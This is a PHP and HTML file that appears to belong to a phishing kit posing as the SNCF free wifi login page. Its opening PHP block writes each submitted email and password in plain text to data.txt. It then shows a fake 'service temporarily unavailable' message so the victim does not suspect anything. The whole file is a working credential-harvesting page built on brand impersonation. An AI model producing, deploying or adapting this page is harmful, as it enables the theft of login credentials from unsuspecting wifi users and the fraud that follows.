<?php
$fp = fopen('data.txt', 'a');
fwrite($fp,"Mail : ".$_POST['inputEmail']."\n"."Password : ".$_POST['inputPassword']."\n\n");
fclose($fp);
 ?>

 <!doctype html>
 <html lang="fr">
 	<head>
 		<meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
 		<link rel="stylesheet" href="./css/bootstrap.min.css"/>
    	<link rel="stylesheet" href="./css/style.css"/>
 		<title>SNCF wifi gratuit</title>
 		<link rel="icon" type="image/png" href="ressources/logo.png"/>
 		<script type="application/javascript" src="./js/jquery-3.3.1.min.js"></script>
     <script type="application/javascript" src="./js/bootstrap.min.js"></script>
     <script type="application/javascript" src="./js/action.js"></script>
 	</head>
 	<body>
 		<div class="container">
 		 <div class="row">
 			 <div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
 				 <div class="card card-signin my-5">
 					 <div class="card-body">
             <div class="text-center">
							 <img src="ressources/logo.png" id="logo" alt="" height="50">
						 </div>
 						 <p class="text-center">Service momentanément indisponible, veuillez réessayer plus tard.</p>
 					 </div>
 				 </div>
 			 </div>
 		 </div>
 	 </div>
 	</body>
 </html>
